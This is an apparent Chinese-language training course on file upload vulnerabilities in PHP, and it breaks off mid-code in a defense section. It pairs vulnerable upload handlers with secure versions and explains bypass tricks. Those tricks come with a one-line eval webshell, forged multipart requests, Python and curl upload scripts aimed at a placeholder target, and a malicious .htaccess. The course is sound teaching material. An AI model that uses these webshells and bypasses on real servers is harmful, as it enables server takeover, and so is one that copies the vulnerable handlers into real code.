# 任意文件上传漏洞

## 课程概述

本课程详细讲解任意文件上传漏洞的原理、绕过技巧和实战利用方法。通过理论学习和靶场实战,全面掌握文件上传漏洞的攻防技术。

### 课程安排

| 模块 | 内容 | 时长 | 学习目标 |
|------|------|------|----------|
| **第一部分** | 文件上传漏洞原理与实现 | 3小时 | 理解文件上传原理、掌握各种实现方式 |
| **第二部分** | 常见绕过方式 | 2小时 | 掌握6种主流绕过技巧 |
| **第三部分** | 文件上传实战 | 2小时 | 通过靶场实操,综合运用所学技巧 |

---

## 第一部分:文件上传漏洞原理(3小时)

### 一、文件上传漏洞概述

#### 1.1 什么是文件上传漏洞?

文件上传漏洞是指Web应用程序在处理用户上传的文件时,未对文件类型、内容、大小等进行严格验证,导致攻击者可以上传恶意文件(如Webshell、木马、病毒等)到服务器,从而获取服务器控制权或执行恶意代码。

#### 1.2 文件上传漏洞的危害

| 危害等级 | 攻击后果 | 具体描述 |
|----------|----------|----------|
| **严重** | 服务器完全沦陷 | 上传Webshell获取服务器控制权 |
| **严重** | 远程代码执行 | 上传可执行脚本文件,执行任意代码 |
| **高危** | 网站被篡改 | 上传恶意页面替换正常页面 |
| **高危** | 敏感信息泄露 | 上传文件读取服务器敏感信息 |
| **中危** | 存储型XSS | 上传包含恶意脚本的HTML文件 |
| **中危** | 钓鱼攻击 | 上传钓鱼页面诱导用户输入敏感信息 |

#### 1.3 文件上传漏洞的形成原因

```php
<?php
// ❌ 危险示例:无任何验证的文件上传
if (isset($_FILES['file'])) {
    $filename = $_FILES['file']['name'];
    $tmp_name = $_FILES['file']['tmp_name'];

    // 直接移动文件,没有任何验证!
    move_uploaded_file($tmp_name, "uploads/" . $filename);
    echo "文件上传成功: " . $filename;
}
?>
```

**形成原因**:
1. **缺少文件类型验证** - 未检查文件后缀名
2. **验证不严格** - 仅使用前端JavaScript验证
3. **验证方法错误** - 使用黑名单而非白名单
4. **文件内容未检查** - 仅检查后缀,不检查文件内容
5. **文件名未处理** - 直接使用用户提供的文件名
6. **存储路径可控** - 攻击者可控制文件保存位置

### 二、HTTP文件上传原理

#### 2.1 HTTP文件上传的工作流程

文件上传采用HTTP POST方法,使用`multipart/form-data`编码类型。

**完整流程**:
1. 用户在前端选择文件
2. 浏览器构造multipart/form-data格式的HTTP请求
3. 服务器接收请求并解析
4. 服务器验证文件(如果有验证机制)
5. 服务器将文件保存到指定位置
6. 返回上传结果给用户

#### 2.2 HTTP上传请求格式详解

**HTML表单示例**:
```html
<form action="upload.php" method="post" enctype="multipart/form-data">
    <label>选择文件:</label>
    <input type="file" name="uploadfile" />
    <input type="submit" value="上传" />
</form>
```

**HTTP请求报文**:
```http
POST /upload.php HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 12345

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadfile"; filename="test.php"
Content-Type: application/x-php

<?php phpinfo(); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**关键字段说明**:

| 字段 | 说明 | 安全注意点 |
|------|------|------------|
| `Content-Type` | multipart/form-data | 必须使用此编码类型 |
| `boundary` | 分隔符,分隔不同字段 | 系统自动生成,攻击时可伪造 |
| `name` | 表单字段名 | 对应$_FILES数组的键 |
| `filename` | 上传的文件名 | ⚠️ 可被攻击者任意修改 |
| `Content-Type`(内部) | 文件的MIME类型 | ⚠️ 可被攻击者伪造 |

#### 2.3 PHP处理上传文件的机制

PHP通过`$_FILES`超全局数组处理上传文件:

```php
<?php
// 打印$_FILES数组结构
print_r($_FILES);

/* 输出示例:
Array
(
    [uploadfile] => Array
        (
            [name] => test.php        // 原始文件名
            [type] => application/x-php  // MIME类型
            [tmp_name] => /tmp/phpXXXXXX // 临时文件路径
            [error] => 0              // 错误代码
            [size] => 25              // 文件大小(字节)
        )
)
*/
?>
```

**$_FILES数组字段详解**:

| 字段 | 类型 | 说明 | 安全注意 |
|------|------|------|----------|
| `name` | 字符串 | 上传文件的原始名称 | ⚠️ 可被伪造,不可信任 |
| `type` | 字符串 | 文件的MIME类型 | ⚠️ 可被伪造,不可信任 |
| `tmp_name` | 字符串 | 服务器临时文件路径 | ✅ 系统生成,可信任 |
| `error` | 整数 | 上传错误代码(0表示成功) | ✅ 系统生成,可信任 |
| `size` | 整数 | 文件大小(字节) | ⚠️ 需要验证是否在允许范围内 |

**文件上传错误代码**:

| 错误代码 | 常量名 | 说明 |
|----------|--------|------|
| 0 | UPLOAD_ERR_OK | 上传成功 |
| 1 | UPLOAD_ERR_INI_SIZE | 文件大小超过php.ini中upload_max_filesize |
| 2 | UPLOAD_ERR_FORM_SIZE | 文件大小超过HTML表单中MAX_FILE_SIZE |
| 3 | UPLOAD_ERR_PARTIAL | 文件只有部分被上传 |
| 4 | UPLOAD_ERR_NO_FILE | 没有文件被上传 |
| 6 | UPLOAD_ERR_NO_TMP_DIR | 找不到临时文件夹 |
| 7 | UPLOAD_ERR_CANT_WRITE | 文件写入失败 |
| 8 | UPLOAD_ERR_EXTENSION | PHP扩展程序中断了文件上传 |

### 三、文件上传功能的实现方式

#### 3.1 基础文件上传实现(不安全)

```php
<?php
// ❌ 危险示例:完全不安全的文件上传
// 文件: basic_upload_unsafe.php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['uploadfile'])) {
        $filename = $_FILES['uploadfile']['name'];
        $tmp_name = $_FILES['uploadfile']['tmp_name'];
        $upload_dir = 'uploads/';

        // 创建上传目录
        if (!file_exists($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }

        // 直接移动文件,没有任何验证
        if (move_uploaded_file($tmp_name, $upload_dir . $filename)) {
            echo "文件上传成功: <a href='{$upload_dir}{$filename}'>{$filename}</a>";
        } else {
            echo "文件上传失败";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>基础文件上传(不安全)</title>
    <meta charset="UTF-8">
</head>
<body>
    <h2>文件上传示例 - 无任何验证</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="uploadfile" />
        <input type="submit" value="上传文件" />
    </form>
</body>
</html>
```

**存在的问题**:
1. ❌ 无文件类型验证
2. ❌ 无文件大小限制
3. ❌ 直接使用用户提供的文件名
4. ❌ 上传目录权限过大(0777)
5. ❌ 未检查文件内容

**攻击演示**:
攻击者可以直接上传`shell.php`:
```php
<?php @eval($_POST['cmd']); ?>
```
然后访问`uploads/shell.php`即可获取Webshell。

#### 3.2 前端JavaScript验证(可绕过)

```html
<!DOCTYPE html>
<html>
<head>
    <title>前端验证(不安全)</title>
    <meta charset="UTF-8">
    <script>
    function validateFile() {
        var file = document.getElementById('uploadfile');
        var filename = file.value;
        var allowed_ext = /(\.jpg|\.jpeg|\.png|\.gif)$/i;

        if (!allowed_ext.exec(filename)) {
            alert('只允许上传图片文件(jpg, jpeg, png, gif)');
            file.value = '';
            return false;
        }
        return true;
    }
    </script>
</head>
<body>
    <h2>前端JavaScript验证(可轻易绕过)</h2>
    <form method="post" action="upload.php" enctype="multipart/form-data" onsubmit="return validateFile()">
        <input type="file" name="uploadfile" id="uploadfile" />
        <input type="submit" value="上传文件" />
    </form>
</body>
</html>
```

```php
<?php
// upload.php - 后端无验证
if (isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];

    move_uploaded_file($tmp_name, "uploads/" . $filename);
    echo "文件上传成功";
}
?>
```

**绕过方法**:
1. 禁用浏览器JavaScript
2. 使用Burp Suite等工具拦截请求,修改文件名
3. 直接构造POST请求,绕过前端

#### 3.3 后端文件扩展名验证

##### 3.3.1 黑名单验证(不推荐)

```php
<?php
// ⚠️ 不推荐:黑名单验证
// 文件: blacklist_upload.php

$blacklist = array('.php', '.php3', '.php4', '.php5', '.phtml', '.asp', '.aspx', '.jsp', '.exe');

if (isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];
    $ext = strtolower(strrchr($filename, '.'));

    // 检查是否在黑名单中
    if (in_array($ext, $blacklist, true)) {
        die("禁止上传该类型文件!");
    }

    move_uploaded_file($tmp_name, "uploads/" . $filename);
    echo "文件上传成功";
}
?>
```

**存在的问题**:
1. ❌ 黑名单不全面,可能遗漏`.php7`、`.pht`等
2. ❌ 大小写绕过(虽然代码中使用了strtolower)
3. ❌ 双写绕过(如`.pphphp`)
4. ❌ 特殊解析后缀(如`.php.`、`.php::$DATA`)

##### 3.3.2 白名单验证(推荐)

```php
<?php
// ✅ 推荐:白名单验证
// 文件: whitelist_upload.php

$whitelist = array('.jpg', '.jpeg', '.png', '.gif');

if (isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];
    $ext = strtolower(strrchr($filename, '.'));

    // 检查是否在白名单中
    if (!in_array($ext, $whitelist, true)) {
        die("只允许上传图片文件!");
    }

    // 重命名文件(使用时间戳+随机数)
    $new_filename = date('YmdHis') . '_' . rand(1000, 9999) . $ext;
    $upload_path = "uploads/" . $new_filename;

    if (move_uploaded_file($tmp_name, $upload_path)) {
        echo "文件上传成功: " . $new_filename;
    } else {
        echo "文件上传失败";
    }
}
?>
```

**安全改进**:
1. ✅ 使用白名单限制文件类型
2. ✅ 使用严格比较(in_array第三个参数为true)
3. ✅ 重命名文件,避免攻击者控制文件名
4. ✅ 转换为小写后再比较

#### 3.4 MIME类型验证

```php
<?php
// ⚠️ 不安全:仅检查MIME类型
// 文件: mime_upload.php

$allowed_mime = array('image/jpeg', 'image/png', 'image/gif');

if (isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];
    $file_type = $_FILES['uploadfile']['type'];  // ⚠️ 可被伪造!

    if (!in_array($file_type, $allowed_mime, true)) {
        die("只允许上传图片文件!");
    }

    move_uploaded_file($tmp_name, "uploads/" . $filename);
    echo "文件上传成功";
}
?>
```

**问题分析**:
- `$_FILES['uploadfile']['type']`来自HTTP请求头的`Content-Type`,可被攻击者任意伪造
- 攻击者可以上传PHP文件,但将Content-Type改为`image/jpeg`,从而绕过验证

**改进方案 - 使用`finfo`检测真实文件类型**:

```php
<?php
// ✅ 更安全:使用finfo检测真实MIME类型
$allowed_mime = array('image/jpeg', 'image/png', 'image/gif');

if (isset($_FILES['uploadfile'])) {
    $filename = $_FILES['uploadfile']['name'];
    $tmp_name = $_FILES['uploadfile']['tmp_name'];

    // 使用finfo检测真实文件类型
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $tmp_name);
    finfo_close($finfo);

    if (!in_array($mime_type, $allowed_mime, true)) {
        die("只允许上传图片文件! 检测到的类型: " . $mime_type);
    }

    $ext = strtolower(strrchr($filename, '.'));
    $whitelist = array('.jpg', '.jpeg', '.png', '.gif');

    if (!in_array($ext, $whitelist, true)) {
        die("文件扩展名不允许!");
    }

    $new_filename = date('YmdHis') . '_' . rand(1000, 9999) . $ext;
    move_uploaded_file($tmp_name, "uploads/" . $new_filename);
    echo "文件上传成功: " . $new_filename;
}
?>
```

#### 3.5 文件内容检测

##### 3.5.1 使用getimagesize检测图片

```php
<?php
// ✅ 检测图片文件头
if (isset($_FILES['uploadfile'])) {
    $tmp_name = $_FILES['uploadfile']['tmp_name'];

    // getimagesize会检查文件头
    $image_info = getimagesize($tmp_name);

    if ($image_info === false) {
        die("这不是一个有效的图片文件!");
    }

    // 继续其他验证...
    echo "图片尺寸: " . $image_info[0] . "x" . $image_info[1];
    echo "<br>图片类型: " . $image_info['mime'];
}
?>
```

##### 3.5.2 检测文件头(Magic Number)

```php
<?php
// ✅ 检测文件魔数(Magic Number)
function checkFileHeader($filepath) {
    $file_headers = array(
        'ffd8ff' => 'image/jpeg',
        '89504e47' => 'image/png',
        '47494638' => 'image/gif',
    );

    $fp = fopen($filepath, 'rb');
    $bin = fread($fp, 4);  // 读取前4字节
    fclose($fp);

    $hex = bin2hex($bin);

    foreach ($file_headers as $header => $mime) {
        if (strpos($hex, $header) === 0) {
            return $mime;
        }
    }

    return false;
}

if (isset($_FILES['uploadfile'])) {
    $tmp_name = $_FILES['uploadfile']['tmp_name'];
    $detected_mime = checkFileHeader($tmp_name);

    if ($detected_mime === false) {
        die("无法识别的文件类型!");
    }

    echo "检测到的MIME类型: " . $detected_mime;
}
?>
```

**常见文件头(Magic Number)**:

| 文件类型 | 文件头(十六进制) | 说明 |
|----------|------------------|------|
| JPEG | `FF D8 FF E0` 或 `FF D8 FF E1` | JPEG图片 |
| PNG | `89 50 4E 47` | PNG图片 |
| GIF | `47 49 46 38` | GIF图片 |
| PDF | `25 50 44 46` | PDF文档 |
| ZIP | `50 4B 03 04` | ZIP压缩包 |
| RAR | `52 61 72 21` | RAR压缩包 |
| EXE | `4D 5A` | Windows可执行文件 |

#### 3.6 综合安全的文件上传实现

```php
<?php
/**
 * 安全的文件上传实现
 * 文件: secure_upload.php
 */

class SecureFileUpload {
    private $allowed_extensions = array('.jpg', '.jpeg', '.png', '.gif');
    private $allowed_mime = array('image/jpeg', 'image/png', 'image/gif');
    private $max_file_size = 2097152;  // 2MB
    private $upload_dir = 'uploads/';

    public function __construct() {
        // 确保上传目录存在
        if (!file_exists($this->upload_dir)) {
            mkdir($this->upload_dir, 0755, true);
        }

        // 创建.htaccess禁止执行PHP
        $htaccess_content = "php_flag engine off\nAddType text/html .php .phtml .php3 .php4 .php5";
        file_put_contents($this->upload_dir . '.htaccess', $htaccess_content);
    }

    public function upload($file) {
        // 1. 检查是否有上传错误
        if ($file['error'] !== UPLOAD_ERR_OK) {
            return array('success' => false, 'message' => '文件上传失败: 错误代码' . $file['error']);
        }

        // 2. 检查文件大小
        if ($file['size'] > $this->max_file_size) {
            return array('success' => false, 'message' => '文件大小超过限制(最大2MB)');
        }

        if ($file['size'] === 0) {
            return array('success' => false, 'message' => '文件大小为0');
        }

        // 3. 检查文件扩展名(白名单)
        $filename = $file['name'];
        $ext = strtolower(strrchr($filename, '.'));

        if (!in_array($ext, $this->allowed_extensions, true)) {
            return array('success' => false, 'message' => '只允许上传图片文件');
        }

        // 4. 检查MIME类型(使用finfo)
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);

        if (!in_array($mime_type, $this->allowed_mime, true)) {
            return array('success' => false, 'message' => '文件类型不允许');
        }

        // 5. 检查图片文件头
        $image_info = getimagesize($file['tmp_name']);
        if ($image_info === false) {
            return array('success' => false, 'message' => '不是有效的图片文件');
        }

        // 6. 重命名文件(随机名称)
        $new_filename = md5(uniqid(rand(), true)) . $ext;
        $upload_path = $this->upload_dir . $new_filename;

        // 7. 移动文件
        if (move_uploaded_file($file['tmp_name'], $upload_path)) {
            // 8. 设置文件权限
            chmod($upload_path, 0644);

            return array(
                'success' => true,
                'message' => '文件上传成功',
                'filename' => $new_filename,
                'path' => $upload_path
            );
        } else {
            return array('success' => false, 'message' => '文件保存失败');
        }
    }
}

// 使用示例
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadfile'])) {
    $uploader = new SecureFileUpload();
    $result = $uploader->upload($_FILES['uploadfile']);

    if ($result['success']) {
        echo "✅ " . $result['message'] . "<br>";
        echo "文件名: " . htmlspecialchars($result['filename']);
    } else {
        echo "❌ " . $result['message'];
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>安全的文件上传</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; margin: 50px; }
        .container { max-width: 600px; margin: 0 auto; }
        .upload-form { background: #f5f5f5; padding: 20px; border-radius: 5px; }
        input[type="file"] { margin: 10px 0; }
        input[type="submit"] { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
        input[type="submit"]:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="container">
        <h2>安全的文件上传示例</h2>
        <div class="upload-form">
            <form method="post" enctype="multipart/form-data">
                <label>选择图片文件(jpg, png, gif, 最大2MB):</label><br>
                <input type="file" name="uploadfile" accept="image/*" required /><br>
                <input type="submit" value="上传文件" />
            </form>
        </div>

        <h3>安全措施:</h3>
        <ul>
            <li>✅ 白名单扩展名验证</li>
            <li>✅ 真实MIME类型检测(finfo)</li>
            <li>✅ 文件头检测(getimagesize)</li>
            <li>✅ 文件大小限制</li>
            <li>✅ 随机文件名</li>
            <li>✅ 上传目录禁止执行PHP(.htaccess)</li>
            <li>✅ 严格的文件权限(0644)</li>
        </ul>
    </div>
</body>
</html>
```

### 四、文件上传配置与环境

#### 4.1 PHP配置文件(php.ini)相关设置

| 配置项 | 默认值 | 说明 | 安全建议 |
|--------|--------|------|----------|
| `file_uploads` | On | 是否允许HTTP文件上传 | 不需要上传功能时设置为Off |
| `upload_max_filesize` | 2M | 单个文件最大上传大小 | 根据需求设置,不宜过大 |
| `max_file_uploads` | 20 | 单次请求最多上传文件数 | 根据需求限制 |
| `post_max_size` | 8M | POST数据最大大小 | 应大于upload_max_filesize |
| `max_execution_time` | 30 | 脚本最大执行时间(秒) | 防止大文件上传超时 |
| `memory_limit` | 128M | 脚本最大内存占用 | 根据服务器配置调整 |

**查看当前配置**:
```php
<?php
echo "file_uploads: " . ini_get('file_uploads') . "<br>";
echo "upload_max_filesize: " . ini_get('upload_max_filesize') . "<br>";
echo "post_max_size: " . ini_get('post_max_size') . "<br>";
echo "max_file_uploads: " . ini_get('max_file_uploads') . "<br>";
?>
```

#### 4.2 Web服务器配置

##### Apache配置

在上传目录创建`.htaccess`:
```apache
# 禁止PHP执行
php_flag engine off

# 禁止访问.php文件
<FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# 强制下载某些类型文件
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    ForceType application/octet-stream
    Header set Content-Disposition attachment
</FilesMatch>
```

##### Nginx配置

```nginx
location /uploads/ {
    # 禁止执行PHP
    location ~ \.php$ {
        deny all;
    }

    # 允许访问图片
    location ~* \.(jpg|jpeg|png|gif)$ {
        access_log off;
    }
}
```

---

## 第二部分:常见的绕过方式(2小时)

### 一、前端验证绕过

#### 1.1 前端验证的原理

前端验证通常使用JavaScript在客户端检查文件类型:

```html
<script>
function checkFile() {
    var file = document.getElementById('file');
    var filename = file.value;

    // 检查扩展名
    if (!/\.(jpg|png|gif)$/i.test(filename)) {
        alert('只允许上传图片!');
        return false;
    }
    return true;
}
</script>

<form onsubmit="return checkFile()" method="post" enctype="multipart/form-data">
    <input type="file" id="file" name="uploadfile" />
    <input type="submit" value="上传" />
</form>
```

#### 1.2 绕过方法

**方法1: 禁用JavaScript**
1. 浏览器设置中禁用JavaScript
2. 火狐浏览器: about:config → javascript.enabled → false
3. Chrome: 设置 → 隐私和安全 → 网站设置 → JavaScript → 禁止

**方法2: 使用Burp Suite拦截修改**

步骤:
1. 先选择一个合法的图片文件(如test.jpg)
2. 点击上传,用Burp Suite拦截请求
3. 在Burp中修改filename和文件内容:

修改前:
```http
Content-Disposition: form-data; name="uploadfile"; filename="test.jpg"
Content-Type: image/jpeg

(图片内容)
```

修改后:
```http
Content-Disposition: form-data; name="uploadfile"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']); ?>
```

**方法3: 直接构造POST请求**

使用Python脚本:
```python
import requests

url = 'http://target.com/upload.php'
files = {'uploadfile': ('shell.php', '<?php phpinfo(); ?>', 'image/jpeg')}

response = requests.post(url, files=files)
print(response.text)
```

使用curl命令:
```bash
curl -X POST -F "uploadfile=@shell.php;type=image/jpeg" http://target.com/upload.php
```

**方法4: 浏览器控制台修改**

1. 打开浏览器开发者工具(F12)
2. 在Console中执行:
```javascript
document.getElementById('file').setAttribute('accept', '*/*');
// 或者删除onsubmit验证
document.querySelector('form').onsubmit = null;
```

#### 1.3 防御措施

```php
<?php
// ✅ 正确做法:后端验证,不依赖前端
$allowed_ext = array('.jpg', '.png', '.gif');
$ext = strtolower(strrchr($_FILES['uploadfile']['name'], '.'));

if (!in_array($ext, $allowed_ext, true)) {
    die("文件类型不允许!");
}

// 前端验证仅用于提升用户体验,不能作为安全依据
?>
```

**安全原则**:
- ❌ 不要仅依赖前端验证
- ✅ 前端验证仅用于用户体验
- ✅ 必须在后端进行严格验证
- ✅ 假设所有客户端输入都是恶意的

### 二、MIME类型绕过

#### 2.1 MIME类型验证的原理

服务器检查HTTP请求头中的`Content-Type`字段:

```php
<?php
// ⚠️ 不安全:仅检查Content-Type
$allowed_mime = array('image/jpeg', 'image/png', 'image/gif');

if (!in_array($_FILES['uploadfile']['type'], $allowed_mime, true)) {
    die("只允许上传图片!");
}

move_uploaded_file($_FILES['uploadfile']['tmp_name'], "uploads/" . $_FILES['uploadfile']['name']);
?>
```

#### 2.2 MIME类型来源

`$_FILES['uploadfile']['type']`的值来自HTTP请求中的`Content-Type`字段,**完全可以被攻击者伪造**。

正常图片上传:
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="uploadfile"; filename="test.jpg"
Content-Type: image/jpeg

(图片二进制数据)
------Boundary--
```

恶意PHP文件上传(伪造MIME):
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="uploadfile"; filename="shell.php"
Content-Type: image/jpeg   ← 伪造为图片类型

<?php @eval($_POST['cmd']); ?>
------Boundary--
```

#### 2.3 绕过方法

**使用Burp Suite绕过**:

1. 抓取上传请求
2. 修改`Content-Type`为允许的类型
3. 修改`filename`为恶意文件名
4. 放行请求

**使用Python脚本绕过**:

```python
import requests

url = 'http://target.com/upload.php'

# 上传PHP文件,但MIME类型伪造为image/jpeg
files = {
    'uploadfile': ('shell.php', '<?php phpinfo(); ?>', 'image/jpeg')
}

response = requests.post(url, files=files)
print(response.text)
```

**常见MIME类型**:

| 文件类型 | Content-Type |
|----------|--------------|
| JPEG图片 | image/jpeg |
| PNG图片 | image/png |
| GIF图片 | image/gif |
| PDF文档 | application/pdf |
| 普通文本 | text/plain |
| HTML文件 | text/html |
| ZIP压缩包 | application/zip |

#### 2.4 防御方法

**方法1: 使用`finfo`检测真实文件类型**:

```php
<?php
$allowed_mime = array('image/jpeg', 'image/png', 'image/gif');

// 使用finfo检测文件真实MIME类型(基于文件内容)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $_FILES['uploadfile']['tmp_name']);
finfo_close($finfo);

if (!in_array($real_mime, $allowed_mime, true)) {
    die("文件类型不允许! 检测到: " . $real_mime);
}
?>
```

**方法2: 使用`mime_content_type`函数**:

```php
<?php
$real_mime = mime_content_type($_FILES['uploadfile']['tmp_name']);

if (!in_array($real_mime, $allowed_mime, true)) {
    die("文件类型不允许!");
}
?>
```

**方法3: 结合多种验证**:

```php
<?php
// 综合验证
$allowed_ext = array('.jpg', '.png', '.gif');
$allowed_mime = array('image/jpeg', 'image/png', 'image/gif');

// 1. 检查扩展名
$ext = strtolower(strrchr($_FILES['uploadfile']['name'], '.'));
if (!in_array($ext, $allowed_ext, true)) {
    die("扩展名不允许!");
}

// 2. 检查真实MIME类型
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$real_mime = finfo_file($finfo, $_FILES['uploadfile']['tmp_name']);
finfo_close($finfo);

if (!in_array($real_mime, $allowed_mime, true)) {
    die("文件类型不允许!");
}

// 3. 检查文件头(针对图片)
if (!getimagesize($_FILES['uploadfile']['tmp_name'])) {
    die("不是有效的图片文件!");
}

// 通过所有验证,允许上传
?>
```

**安全原则**:
- ❌ 不要信任`$_FILES['xxx']['type']`
- ❌ 不要只依赖单一验证方式
- ✅ 使用`finfo`检测真实文件类型
- ✅ 结合扩展名、MIME、文件头多重验证

### 三、后缀名绕过

文件后缀名绕过是文件上传漏洞中最常见的攻击手法,通过各种技巧绕过服务器的扩展名检查。

#### 3.1 大小写绕过

**漏洞代码**:
```php
<?php
// ⚠️ 存在漏洞:未转换大小写
$blacklist = array('.php', '.asp', '.aspx', '.jsp');
$ext = strrchr($_FILES['uploadfile']['name'], '.');  // 未使用strtolower

if (in_array($ext, $blacklist, true)) {
    die("禁止上传该类型文件!");
}

move_uploaded_file($_FILES['uploadfile']['tmp_name'], "uploads/" . $_FILES['uploadfile']['name']);
?>
```

**绕过方法**:
上传文件名:`shell.PhP`、`shell.Php`、`shell.pHp`

Windows系统不区分大小写,`shell.PhP`会被当作PHP文件执行。

**防御方法**:
```php
<?php
// ✅ 正确做法:转换为小写再比较
$ext = strtolower(strrchr($_FILES['uploadfile']['name'], '.'));

if (in_array($ext, $blacklist, true)) {
    die("禁止上传该类型文件!");
}
?>
```

#### 3.2 空格绕过

**Windows特性**:Windows会自动删除文件名末尾的空格。

**绕过示例**:
上传文件名:`shell.php `(php后面有空格)

服务器检查时:`shell.php `不在黑名单中,允许上传
保存到Windows系统后:自动变成`shell.php`

**攻击演示**:
```http
Content-Disposition: form-data; name="uploadfile"; filename="shell.php "
                                                                       ↑ 注意这里有空格
```

**防御方法**:
```php
<?php
// ✅ 去除文件名首尾空格
$filename = trim($_FILES['uploadfile']['name']);
$ext = strtolower(strrchr($filename, '.'));
?>
```

#### 3.3 点号绕过

**Windows特性**:Windows会自动删除文件名末尾的点号`.`。

**绕过示例**:
上传文件名:`shell.php.`、`shell.php..`

服务器检查:`shell.php.`提取扩展名为`.`,不在黑名单
Windows保存后:自动变成`shell.php`

**攻击演示**:
```http
Content-Disposition: form-data; name="uploadfile"; filename="shell.php."
```

**防御方法**:
```php
<?php
// ✅ 去除文件名末尾的点号
$filename = trim($_FILES['uploadfile']['name'], '. ');
$ext = strtolower(strrchr($filename, '.'));
?>
```

#### 3.4 特殊后缀名绕过

某些Web服务器会将特殊后缀名当作PHP文件执行:

| ���缀名 | 说明 | 适用环境 |
|--------|------|----------|
| `.php3`, `.php4`, `.php5`, `.php7` | PHP旧版本扩展名 | Apache配置不当时 |
| `.phtml` | PHP模板文件 | Apache默认配置 |
| `.pht`, `.phps` | PHP相关扩展名 | 特定配置下 |
| `.inc` | Include文件 | 配置不当时 |

**绕过示例**:
如果黑名单只有`.php`:
```php
$blacklist = array('.php');
```

上传文件名:`shell.phtml`、`shell.php5`等

**防御方法**:
```php
<?php
// ✅ 完善的黑名单(仍不推荐黑名单)
$blacklist = array(
    '.php', '.php3', '.php4', '.php5', '.php7',
    '.phtml', '.pht', '.phps', '.inc',
    '.asp', '.aspx', '.asa', '.cer', '.cdx',
    '.jsp', '.jspx'
);

// ✅ 更推荐:使用白名单
$whitelist = array('.jpg', '.jpeg', '.png', '.gif');
$ext = strtolower(strrchr($filename, '.'));

if (!in_array($ext, $whitelist, true)) {
    die("只允许上传图片文件!");
}
?>
```

#### 3.5 双写绕过

**漏洞代码**:
```php
<?php
// ⚠️ 危险:简单的字符串替换
$filename = $_FILES['uploadfile']['name'];
$filename = str_replace('.php', '', $filename);

move_uploaded_file($_FILES['uploadfile']['tmp_name'], "uploads/" . $filename);
?>
```

**绕过方法**:
上传文件名:`shell.pphphp`

处理过程:
1. 原始文件名:`shell.pphphp`
2. 替换掉`.php`:`shell.pphphp` → `shell.php`
3. 最终保存为:`shell.php`

**其他双写变形**:
- `shell.p.phphp`
- `shell..phphpp`
- `shell.pphhpp`

**防御方法**:
```php
<?php
// ✅ 不要用替换方法,使用白名单验证
$whitelist = array('.jpg', '.jpeg', '.png', '.gif');
$ext = strtolower(strrchr($filename, '.'));

if (!in_array($ext, $whitelist, true)) {
    die("文件类型不允许!");
}
?>
```

#### 3.6 截断绕过

##### 3.6.1 %00截断(PHP < 5.3.4)

**原理**:早期PHP版本中,`%00`(NULL字节)会截断字符串。

**漏洞代码**:
```php
<?php
// ⚠️ PHP < 5.3.4存在截断漏洞
$filename = $_FILES['uploadfile']['name'];
$upload_path = "uploads/" . $filename . ".jpg";  // 强制添加.jpg后缀

move_uploaded_file($_FILES['uploadfile']['tmp_name'], $upload_path);
?>
```

**绕过方法**:
上传文件名:`shell.php%00`

处理过程:
1. 原始:`shell.php%00`
2. 拼接:`uploads/shell.php%00.jpg`
3. `%00`被解析为NULL,字符串截断,实际保存为:`uploads/shell.php`

**在Burp中修改**:
```http
Content-Disposition: form-data; name="uploadfile"; filename="shell.php%00"
```

或者直接使用十六进制编辑,将`%00`改为`\x00`。

**防御方法**:
```php
<?php
// ✅ 升级PHP版本到5.3.4以上
// ✅ 使用随机文件名,不拼接用户输入
$ext = strtolower(strrchr($_FILES['uploadfile']['name'], '.'));
$new_filename = md5(uniqid()) . $ext;
$upload_path = "uploads/" . $new_filename;
?>
```

##### 3.6.2 路径截断(0x00)

**原理**:在某些系统中,可以通过构造特殊路径绕过限制。

**绕过示例**:
```
shell.php[0x00].jpg
```

**防御**:
- 严格过滤文件名中的特殊字符
- 使用随机文件名
- 升级系统和PHP版本

#### 3.7 .htaccess文件攻击

**原理**:如果允许上传`.htaccess`文件,攻击者可以修改Apache配置,将其他后缀名当作PHP执行。

**攻击步骤**:

步骤1:上传`.htaccess`文件:
```apache
AddType application/x-httpd-php .jpg
# 或者
<FilesMatch "\.jpg$">
SetHandler application/x-httpd-php
</FilesMatch>
```

步骤2:上传`shell.jpg`(实际是PHP代码):
```php
<?php @eval($_POST['cmd']); ?>
```

步骤3:访问`shell.jpg`,服务器会当作PHP执行。

**防御方法**:
```php
<?php
// ✅ 禁止上传.htaccess文件
$filename = $_FILES['uploadfile']['name'];

if ($filename === '.htaccess' || $filename === '.user.ini') {
    die("禁止上传配置文件!");
}

// ✅ 在上传目录中放置安全的.htaccess
